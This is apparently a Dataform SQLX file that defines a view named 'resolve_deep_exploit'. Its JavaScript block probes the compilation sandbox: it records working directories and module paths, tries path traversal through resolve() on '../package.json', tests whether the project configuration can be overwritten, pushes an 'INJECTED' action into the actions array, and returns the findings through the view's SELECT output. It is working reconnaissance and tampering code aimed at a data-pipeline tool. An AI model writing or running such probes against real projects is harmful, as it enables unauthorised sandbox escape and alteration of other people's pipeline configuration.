config { type: "view", name: "resolve_deep_exploit" }

js {
  let r = { t: new Date().toISOString() };

  // CWD Discovery
  try {
    r.cwd = {};
    if (typeof process !== 'undefined' && process.cwd) r.cwd.processCwd = process.cwd();
    if (typeof __dirname !== 'undefined') r.cwd.__dirname = __dirname;
    if (typeof __filename !== 'undefined') r.cwd.__filename = __filename;
    if (typeof module !== 'undefined') r.cwd.moduleFilename = module.filename;
    if (typeof dataform !== 'undefined') r.cwd.rootDir = dataform.rootDir;
  } catch(e) { r.cwd = { err: e.message }; }

  // resolve() behavior
  try {
    if (typeof resolve === 'function') {
      r.resolve = { len: resolve.length, src: resolve.toString().substring(0, 200) };
      try { r.resolve.simple = String(resolve('simple_test')); } catch(e) { r.resolve.simple = 'E:' + e.message; }
      try { r.resolve.traverse1 = String(resolve('../package.json')); } catch(e) { r.resolve.traverse1 = 'E:' + e.message; }
      try { r.resolve.traverse3 = String(resolve('../../../package.json')); } catch(e) { r.resolve.traverse3 = 'E:' + e.message; }
    }
  } catch(e) { r.resolve = { err: e.message }; }

  // ref() - only valid refs
  try {
    r.ref = {};
    try { r.ref.simple = String(ref('simple_test')); } catch(e) { r.ref.simple = 'E:' + e.message.substring(0,50); }
  } catch(e) { r.ref = { err: e.message }; }

  // require.resolve paths
  try {
    if (typeof require !== 'undefined' && require.resolve) {
      r.reqResolve = {};
      try { r.reqResolve.dfcore = require.resolve('@dataform/core'); } catch(e) { r.reqResolve.dfcore = 'E:' + e.message; }
      try { r.reqResolve.paths = require.resolve.paths?.('@dataform/core'); } catch(e) {}
    }
  } catch(e) { r.reqResolve = { err: e.message }; }

  // Config modification
  try {
    r.configMod = {};
    if (dataform && dataform.projectConfig) {
      r.configMod.frozen = Object.isFrozen(dataform.projectConfig);
      r.configMod.keys = Object.keys(dataform.projectConfig);
      const orig = dataform.projectConfig.defaultDatabase;
      try {
        dataform.projectConfig.defaultDatabase = "TEST";
        r.configMod.modified = dataform.projectConfig.defaultDatabase === "TEST";
        dataform.projectConfig.defaultDatabase = orig;
      } catch(e) { r.configMod.modErr = e.message; }
    }
  } catch(e) { r.configMod = { err: e.message }; }

  // Actions array
  try {
    r.actions = {};
    if (dataform && dataform.actions) {
      r.actions.count = dataform.actions.length;
      r.actions.frozen = Object.isFrozen(dataform.actions);
      r.actions.names = dataform.actions.slice(0,5).map(a => a.name);
      // Try push
      try {
        const len = dataform.actions.length;
        dataform.actions.push({ name: 'INJECTED', type: 'view' });
        r.actions.pushed = dataform.actions.length > len;
      } catch(e) { r.actions.pushErr = e.message; }
    }
  } catch(e) { r.actions = { err: e.message }; }

  // declare() function
  try {
    r.declare = {};
    if (typeof declare === 'function') {
      r.declare.available = true;
      r.declare.sig = declare.toString().substring(0,150);
    }
  } catch(e) { r.declare = { err: e.message }; }
}

SELECT '${JSON.stringify(r)}' as r
